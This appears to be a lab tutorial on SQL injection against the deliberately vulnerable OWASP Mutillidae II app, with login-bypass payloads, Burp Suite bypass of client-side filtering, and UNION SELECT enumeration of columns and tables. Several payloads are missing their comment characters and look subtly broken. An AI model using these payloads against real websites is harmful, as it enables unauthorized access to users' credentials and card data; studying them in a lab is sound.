<img width="1440" height="710" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/cb14e3c4-94a6-4e34-a4ec-859a32304f4f" /> Introduction to SQL Injection

In this lecture and the next few lectures, we will learn about a very common web vulnerability called **SQL Injection (SQLi)**.

Before learning how SQL Injection works or how to exploit it, we first need to understand what **SQL** and **databases** are.

---

 What is a Database?

Most modern websites use a **database** to store information.
Only very small or simple websites may not use one.

Databases are used to store:

* Usernames
* Passwords
* Blog posts
* News articles
* Images
* Comments
* Credit card details
* And almost all website data

The website communicates with the database to:

* Read data
* Insert new data
* Update existing data
* Delete data

---

 What is SQL?

SQL stands for **Structured Query Language**.

It is the language used by web applications to communicate with databases.

Using SQL, applications can:

* Retrieve information
* Add new records
* Modify existing records
* Delete records

---

 Understanding Databases in Practice

In this example, we log into the database installed on the **Metasploitable 2** machine.

This is **not hacking**.
We are only exploring how databases work.

We log into MySQL:

```bash id="iq1jlwm"
mysql -u root
```

* `-u root` → login as root user
* Metasploitable has no root password (intentionally vulnerable)

---

 Viewing Databases

To see all available databases:

```sql id="suxb3e"
show databases;
```

Example databases:

* `information_schema`
* `mysql`
* `dvwa`
* `owasp10`
* `metasploit`

Each web application usually has its **own database**.

For example:

* DVWA uses the `dvwa` database
* OWASP WebGoat uses another database


---

 Selecting a Database

To use a specific database:

```sql id="vqv55v"
use owasp10;
```

---

 Viewing Tables

Each database contains **tables**.

Tables store related information.

Example:

* `accounts`
* `blogs`
* `credit_cards`

To display tables:

```sql id="ng13fm"
show tables;
```

---


 Viewing Data Inside a Table

To view all data from the `accounts` table:

```sql id="e9dnwy"
select * from accounts;
```

* `select` → retrieve data
* `*` → select everything
* `from accounts` → from the accounts table

This may display:

* Usernames
* Passwords
* User IDs
* Admin status

---



 Example Output

| ID | Username | Password     | Admin |
| -- | -------- | ------------ | ----- |
| 1  | admin    | adminpass    | yes   |
| 2  | adrian   | somepassword | no    |

---

 Important Concepts

 Database

Stores website information

 Table

Stores specific categories of data

 Columns

Fields inside a table
Example:

* username
* password
* email

 SQL Queries

Commands used to interact with databases

---

 Goal of SQL Injection

Normally, only website administrators can access the database directly.

In upcoming labs, we will learn how attackers exploit SQL Injection vulnerabilities to:

* Access databases
* Read sensitive data
* Modify records
* Delete information
* Gain full database control


Why SQL Injection is Dangerous

SQL Injection (SQLi) is one of the most dangerous web vulnerabilities because it gives attackers direct access to the website’s database. Since databases store important information like usernames, passwords, emails, credit cards, and private user data, a single SQL Injection vulnerability can expose the entire application.

Many popular websites have suffered from SQL Injection vulnerabilities because they are easy to create accidentally and difficult to secure properly. In many cases, attackers do not even need a reverse shell or PHP upload because accessing the database already gives them everything they need.

An attacker can use SQL Injection to read sensitive information, modify data, create admin accounts, delete records, or sometimes even upload malicious files and gain full control over the server. This is why SQL Injection is considered one of the most critical vulnerabilities in web security.



 Discovering SQL Injection Vulnerabilities

To find SQL Injection vulnerabilities, testers usually browse through the website and try to “break” different pages. Any place that accepts user input such as login forms, search boxes, or URL parameters can potentially be vulnerable.

One common way to test for SQL Injection is by inserting special characters like a single quote:

```sql id="u0mb34"
'
```

If the application behaves strangely or shows a database error, it may indicate that the input is being processed directly inside an SQL query.

---

 Testing in Mutillidae

In **OWASP Mutillidae II**, first register a normal account.
For example:

* Username: `adil`
* Password: `123456`

Now try logging in again, but this time enter:

* Username: `adil`
* Password:

```sql id="kpy38v"
'
```

This produces a database error, which is very useful because it reveals part of the SQL query being executed.

Usually in real-world applications, detailed database errors are hidden, but for learning purposes this helps us understand how SQL Injection works.

<img width="1438" height="329" alt="Screenshot 2026-05-09 at 7 55 18 AM" src="https://github.com/user-attachments/assets/5cd919d0-7713-4004-84ec-d1c85409fdd3" />

---

The query becomes something like:

```sql id="bbawzk"
SELECT * FROM accounts 
WHERE username='adil' 
AND password=''';
```

The extra quote breaks the SQL query and causes an error.

---

 Bypassing Login as Admin

Now suppose we want to log in as admin without knowing the password.

The normal query looks like:

```sql id="q8pbt6"
SELECT * FROM accounts 
WHERE username='admin' 
AND password='password';
```

We can manipulate the password field using:

```sql id="mlv3x7"
12' OR 1=1
```

The query now becomes:

```sql id="73p7gi"
SELECT * FROM accounts 
WHERE username='admin' 
AND password='12' OR 1=1;
```

Since `1=1` is always true, the login condition becomes true and authentication is bypassed.

<img width="1440" height="493" alt="PHP Scripts Of OWASP Top" src="https://github.com/user-attachments/assets/ecf40a16-2e31-4daf-906a-21ddc9983d5f" />


---

 Another Login Bypass Method

We can also inject directly into the username field:

```sql id="q8fg5m"
admin' 
```

The query becomes:

```sql id="aq2sh2"
SELECT * FROM accounts 
WHERE username='admin'' 
AND password='';
```

Everything after `` becomes a comment, so the password check is ignored completely.

<img width="1440" height="562" alt="Screenshot 2026-05-09 at 8 08 30 AM" src="https://github.com/user-attachments/assets/41b0ada3-9502-4413-93d1-b49360f8d2b2" />


---

 SQL Injection at Security Level 1

Now increase the security level from `0` to `1`.

When trying the same payload directly in the browser, the request gets blocked and nothing appears in **Burp Suite**.

This happens because the filtering is occurring on the **client side**.

---

 Client-Side Request

A client-side request means the filtering happens inside the browser before the data is sent to the server.

Example payload:

```sql id="u25gpk"
' OR 1=1
```

The browser detects dangerous characters like:

* `'`
* ``

and blocks the request immediately.

Flow:

```text id="vyjlwm"
Browser → Blocked → Server never receives request
```

---

 Server-Side Request

A server-side request means the data reaches the server first, and then the server checks it.

Flow:

```text id="jlwm7k"
Browser → Server → Input checked
```

Server-side filtering is much stronger because attackers cannot bypass it easily using browser tricks.

---

 Using Burp Suite to Bypass Client-Side Filtering

If we enter a normal username and password, the request successfully appears inside Burp Suite.

Example:

* Username: `admin`
* Password: `aaa`

<img width="1440" height="675" alt="Screenshot 2026-05-09 at 8 17 49 AM" src="https://github.com/user-attachments/assets/9565d3f7-2bc3-4b87-a2b5-dd223a6cbfb8" />


---

Since the request already bypassed the browser filter, we can now modify it manually inside Burp Suite.

Change the username to:

```sql id="rd4bz5"
admin' 
```

Then forward the request.

The server processes the modified SQL query and the login is bypassed successfully.

<img width="1439" height="770" alt="Screenshot 2026-05-09 at 8 18 37 AM" src="https://github.com/user-attachments/assets/59c9bdc7-96f6-4505-a949-91a05b3e1818" />


<img width="1078" height="37" alt="Screenshot 2026-05-09 at 8 21 44 AM" src="https://github.com/user-attachments/assets/ddc9934b-8399-4e4e-b224-4b9945400548" />

<img width="1416" height="429" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/97da232c-4b5c-450b-864a-fe55f0e4a552" />

---

 SQL Injection – High Security Level

At High security level, the same SQL Injection payload no longer works, even when using Burp Suite.

Payload:

```sql id="ie3rt7"
' OR 1=1
```

Result:

```text id="jlwm9x"
Bad username or password
```



 Why the Attack Fails

At low and medium levels, the application used queries like:

```php id="u0a9w1"
SELECT * FROM accounts 
WHERE username='$username' 
AND password='$password';
```

This directly inserted user input into the SQL query, making it vulnerable.

---

 What High Security Changes

The high security version uses a function similar to:

```php id="jlwm3z"
mysqli_real_escape_string()
```

This function escapes or removes dangerous characters such as:

* `'`
* `"`
* special characters

So a payload like:

```sql id="jlwm4v"
admin'
```

gets treated as normal text instead of executable SQL code.

The application also hardcodes quotes around the input:

```php id="jlwm5n"
WHERE username='$username'
```

Because of this:

* Everything inside the quotes becomes a string
* Injected SQL code is not executed

---

 Key Takeaway

* Low security → vulnerable to direct SQL Injection
* Medium security → uses weak client-side filtering
* High security → escapes dangerous characters and blocks injection attempts

This is why proper input handling and secure coding are important in web applications.



{{ Discovering SQL Injection Through URL Parameters (GET Method) }}

In this example, we are testing for an SQL Injection vulnerability on a page that displays user information.

Previously, the injection was performed through a login form using the **POST** method. This time, the application passes user input directly through the URL using the **GET** method.

Example:

```text id="4zjlwm"
userinfo.php?username=adil&password=123456
```

Here, the username and password are visible in the URL, which means we can directly modify them and test for SQL Injection.

<img width="1440" height="689" alt="Screenshot 2026-05-12 at 7 41 49 AM" src="https://github.com/user-attachments/assets/cca75684-d097-4382-9e63-452cc2bf8357" />

<img width="1428" height="705" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/151400be-7245-4633-8610-a933ec5f94be" />

---

Example full URL:

```text id="jlwm1a"
http://172.16.219.181/mutillidae/index.php?page=user-info.php&username=adil&password=123456&user-info-php-submit-button=View+Account+Details
```

During penetration testing, whenever you see parameters like:

```text id="jlwm2b"
page.php?id=2
```

or

```text id="jlwm3c"
news.php?id=5
```

you should always test them because the application may be using those values directly inside SQL queries.

The backend query in this case is similar to:

```sql id="jlwm4d"
SELECT * FROM accounts 
WHERE username='adil' 
AND password='123456';
```

---

Testing with ORDER BY

To test the vulnerability, SQL code is injected into the username parameter using an `ORDER BY` statement.

Payload:

```sql id="jlwm5e"
adil' ORDER BY 1
```

What happens here:

* `'` closes the original username string
* `ORDER BY 1` sorts results using the first column
* `` comments out the rest of the query

The final SQL query becomes:

```sql id="jlwm6f"
SELECT * FROM accounts 
WHERE username='adil' ORDER BY 1'
AND password='123456';
```

Since everything after `` is ignored, the injected SQL executes successfully.

If the page loads normally, it means the SQL query accepted our injection.

<img width="1440" height="710" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/66ca7036-3d25-4d10-a4a2-9653855d9455" />

---

 Confirming the Vulnerability

Next, a very large column number is tested:

```sql id="jlwm7g"
adil' ORDER BY 100000
```

Because the table does not have 100000 columns, the database returns an error such as:

```text id="jlwm8h"
Unknown column '100000'
```

This confirms that:

* Our SQL code is being executed
* The query is being modified successfully
* The application is vulnerable to SQL Injection

<img width="1438" height="880" alt="Screenshot 2026-05-12 at 7 48 41 AM" src="https://github.com/user-attachments/assets/75059b04-c102-4119-b6dd-d975b91781ac" />



If changing injected SQL statements changes the database response or produces database errors, the application is likely vulnerable to SQL Injection.


{{ Finding the Number of Columns in SQL Injection }} 

Now that we confirmed the page is vulnerable to SQL Injection, the next step is finding out how many columns are being used in the SQL query.

To do that, we use the `ORDER BY` statement.

We already know:

```sql id="jlwm1q"
ORDER BY 1
```

worked successfully, while:

```sql id="jlwm2w"
ORDER BY 100000
```

returned an error.

So we continue testing different numbers:

```sql id="jlwm3e"
ORDER BY 5
```

✅ Works normally

```sql id="jlwm4r"
ORDER BY 6
```

❌ Returns an error

This tells us the query is selecting exactly **5 columns**.
Anything higher than 5 causes an error because that column does not exist.

---

 Using UNION SELECT

Now that we know the number of columns, we can create our own query using `UNION SELECT`.

The original query looks something like:

```sql id="jlwm5t"
SELECT * FROM accounts 
WHERE username='adil';
```

We inject:

```sql id="jlwm6y"
' UNION SELECT 1,2,3,4,5
```

Here:

* `UNION SELECT` combines our results with the original query
* We provide 5 values because the original query has 5 columns
* `` comments out the remaining part of the SQL query

<img width="1440" height="863" alt="Screenshot 2026-05-12 at 7 58 50 AM" src="https://github.com/user-attachments/assets/04377012-ca6f-4253-9ea9-807d59dae6f8" />

---

When executed, the webpage displays some of the numbers like `2`, `3`, and `4`.

This helps identify which columns are visible on the webpage.

Example:

* Column `2` appears in the **First Name** field
* Column `3` appears in the **Surname** field
* Column `4` appears in the **Signature** field

---

 Extracting Database Information

Instead of displaying numbers, we can use useful SQL functions:

```sql id="jlwm7u"
' UNION SELECT 1,database(),user(),version(),5
```

This retrieves:

* `database()` → current database name
* `user()` → current database user
* `version()` → MySQL version

The results showed:

* Current database: `owasp10`
* Current user: `root@localhost`
* MySQL version: `5.0.51`

<img width="1440" height="876" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/cbeddab5-1799-4c25-b808-7afad0bdb064" />


---

 What This Means

This tells us:

* The application is connected to the `owasp10` database
* The website is using the MySQL `root` account
* We can now start extracting tables, columns, and sensitive data from the database

In real-world applications, websites usually use limited database accounts instead of the root user. This helps restrict access only to the website’s own database and improves security.


{{ Discovering Database Tables with SQL Injection }}

Now that we know the current database is called `owasp10`, the next step is to discover the tables inside that database.

To do this, we use `UNION SELECT` again, but this time we query MySQL’s internal database called `information_schema`.

`information_schema` is a default MySQL database that stores metadata about:

* databases
* tables
* columns

The injection used is:

```sql id="jlwm1m"
adil' UNION SELECT null,table_name,null,null,null 
FROM information_schema.tables %23
```

Here:

* `table_name` retrieves the table names
* `information_schema.tables` contains information about all tables
* `NULL` is used for unused columns because the original query has 5 columns
* `%23` is the URL-encoded version of `` used for comments

<img width="1440" height="900" alt="Screenshot 2026-05-12 at 8 08 27 AM" src="https://github.com/user-attachments/assets/2bdfa630-c0e9-4aeb-a4d0-c52e54ebefa1" />

---

When executed, the page returns many table names — around 237 results.

This happens because the database user is `root`, which has permission to view tables from multiple databases on the server.

In real-world applications, websites usually use limited database accounts, so attackers normally only see tables belonging to the current database.

---

 Filtering Tables from the Current Database

To display only tables from the `owasp10` database, we add a `WHERE` clause:

```sql id="jlwm2n"
adil' UNION SELECT null,table_name,null,null,null 
FROM information_schema.tables 
WHERE table_schema='owasp10'%23
```

Now the results only show tables belonging to the `owasp10` database, such as:

* `accounts`
* `blogs_table`
* `credit_cards`
* `hitlog`
* `pentest_tools`

<img width="1440" height="836" alt="Screenshot 2026-05-12 at 8 20 57 AM" src="https://github.com/user-attachments/assets/fa0043ed-7e91-490b-bf4a-78924d6faae3" />

---

 What We Achieved

At this point, we successfully enumerated the database structure and discovered the available tables inside the target database.

These tables can later be targeted to extract sensitive information such as:

* usernames
* passwords
* credit card data
* application information


